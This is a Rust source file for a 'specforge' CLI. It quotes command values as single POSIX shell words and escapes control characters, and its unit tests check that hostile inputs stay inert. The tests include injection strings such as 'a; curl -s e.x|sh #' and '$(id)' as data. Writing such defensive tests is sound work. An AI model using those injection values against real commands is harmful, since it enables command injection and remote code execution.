//! The commands a remedy names (ADR 0135, ADR 0230): a `specforge` command whose values come from
//! somewhere the host does not decide (a lock entry, a specforge.json entry, a declaration) is written
//! so a POSIX shell reads each value back as one word, unchanged.

use std::borrow::Cow;

/// `template` (a `specforge …` command, its `{}` standing for `values` in order) with each value
/// written as one shell word: bare when it is non-empty and only `A-Z a-z 0-9 @ % + = : , . / _ -`,
/// else single-quoted with each `'` as `'\''`. A control character is written as its escape
/// ([`printable`]), so no value starts a line or a terminal sequence; such a value is none the host
/// records (the lock refuses it, a package name has none). A `{}` with no value left stays `{}`.
/// A value is never scanned again, so one holding `{}` is not substituted.
pub fn command(template: &str, values: &[&str]) -> String {
    let mut values = values.iter();
    let mut parts = template.split("{}");
    let mut out = parts.next().unwrap_or_default().to_string();
    for part in parts {
        match values.next() {
            Some(value) => out.push_str(&word(value)),
            None => out.push_str("{}"),
        }
        out.push_str(part);
    }
    out
}

/// `text` with each control character (`char::is_control`: C0, DEL, C1) written as its escape
/// (`\n`, `\u{1b}`); the text itself when it holds none.
pub fn printable(text: &str) -> Cow<'_, str> {
    if !text.contains(char::is_control) {
        return Cow::Borrowed(text);
    }
    Cow::Owned(
        text.chars()
            .map(|c| {
                if c.is_control() {
                    c.escape_default().to_string()
                } else {
                    c.to_string()
                }
            })
            .collect(),
    )
}

fn word(value: &str) -> String {
    let bare = !value.is_empty()
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "@%+=:,./_-".contains(c));
    if bare {
        return value.to_string();
    }
    format!("'{}'", printable(value).replace('\'', "'\\''"))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Values that hold no control character, as a shell must read them back.
    const VALUES: [&str; 12] = [
        "ext/a.wasm",
        "@sdk/greet@0.1.0",
        "",
        "My Ext/a.wasm",
        "it's",
        "a; curl -s e.x|sh #",
        "$(id)",
        "`id`",
        "~/x",
        "a*b",
        "é.wasm",
        "{} again",
    ];

    #[test]
    fn a_value_is_one_shell_word_whatever_it_holds() {
        let one = |value| command("specforge add {}", &[value]);
        assert_eq!(one("ext/a.wasm"), "specforge add ext/a.wasm");
        assert_eq!(one("@sdk/greet@0.1.0"), "specforge add @sdk/greet@0.1.0");
        assert_eq!(one(""), "specforge add ''");
        assert_eq!(one("My Ext/a.wasm"), "specforge add 'My Ext/a.wasm'");
        assert_eq!(one("it's"), "specforge add 'it'\\''s'");
        assert_eq!(
            one("a; curl -s e.x|sh #"),
            "specforge add 'a; curl -s e.x|sh #'"
        );
        for quoted in ["$(id)", "`id`", "~/x", "a*b", "é.wasm"] {
            assert_eq!(one(quoted), format!("specforge add '{quoted}'"));
        }
        assert_eq!(
            command("specforge login --registry {} --token <TOKEN>", &["a b"]),
            "specforge login --registry 'a b' --token <TOKEN>"
        );
        assert_eq!(command("specforge add {}", &["{}"]), "specforge add '{}'");
        assert_eq!(command("add {} {}", &["x"]), "add x {}");
    }

    #[test]
    fn a_control_character_is_written_as_its_escape() {
        let shown = printable("a\nb\u{1b}[8m");
        assert_eq!(shown, "a\\nb\\u{1b}[8m");
        assert!(!shown.contains(char::is_control));
        assert!(matches!(printable("plain"), Cow::Borrowed("plain")));
        let word = command("specforge add {}", &["x\ny"]);
        assert_eq!(word, "specforge add 'x\\ny'");
    }

    #[cfg(unix)]
    #[test]
    fn a_quoted_value_reads_back_through_sh() {
        for value in VALUES {
            let word = word(value);
            let output = std::process::Command::new("sh")
                .arg("-c")
                .arg(format!("printf '%s' {word}"))
                .stdin(std::process::Stdio::null())
                .output()
                .unwrap();
            assert_eq!(String::from_utf8_lossy(&output.stdout), value, "{word}");
        }
    }
}
